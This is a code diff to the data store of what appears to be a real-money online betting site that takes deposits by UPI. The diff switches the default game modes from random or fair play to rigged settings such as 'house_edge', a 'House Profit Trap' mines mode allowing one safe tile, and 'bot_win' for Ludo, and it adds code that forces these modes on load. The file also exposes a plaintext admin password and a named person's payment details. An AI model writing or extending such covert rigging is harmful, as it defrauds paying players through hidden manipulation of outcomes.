@@ -34,16 +34,16 @@ class DataStore {
             macrodroid_logs: [],
             settings: {
                 admin_password: 'spp213201pty',
-                game_mode: 'random',
+                game_mode: 'house_edge', // Smart House-Edge (Profit Max) by default!
                 manual_number: '',
-                aviator_mode: 'smart_profit',
+                aviator_mode: 'smart_profit', // Smart Max-Profit AI by default!
                 aviator_crash: '2.00',
                 aviator_force_ts: '0',
-                mines_mode: 'random',
+                mines_mode: 'house_profit', // House Profit Trap by default!
                 mines_max_safe: '1',
                 k3_mode: 'random',
                 k3_dice: '1,2,3',
-                ludo_mode: 'fair',
+                ludo_mode: 'bot_win', // House Profit (Bot Wins) by default!
                 upi_id: 'akshit9908@barodampay',
                 upi_name: 'AKSHIT KUMAR SAXENA',
                 deposit_upi_id: 'akshit9908@barodampay',
@@ -94,6 +94,12 @@ class DataStore {
                 if (!this.data.settings.pythonanywhere_url) {
                     this.data.settings.pythonanywhere_url = 'https://backandsopport.pythonanywhere.com';
                 }
+                // Enforce Max Profit by default
+                if (!this.data.settings.game_mode) this.data.settings.game_mode = 'house_edge';
+                if (!this.data.settings.aviator_mode) this.data.settings.aviator_mode = 'smart_profit';
+                if (!this.data.settings.mines_mode) this.data.settings.mines_mode = 'house_profit';
+                if (!this.data.settings.mines_max_safe) this.data.settings.mines_max_safe = '1';
+                if (!this.data.settings.ludo_mode) this.data.settings.ludo_mode = 'bot_win';
                 if (this.data.users.length > 0) {
                     const maxId = Math.max(...this.data.users.map(u => u.id || 0));
                     this.data.nextUserId = Math.max(101001, this.data.nextUserId || 101001, maxId + 1);
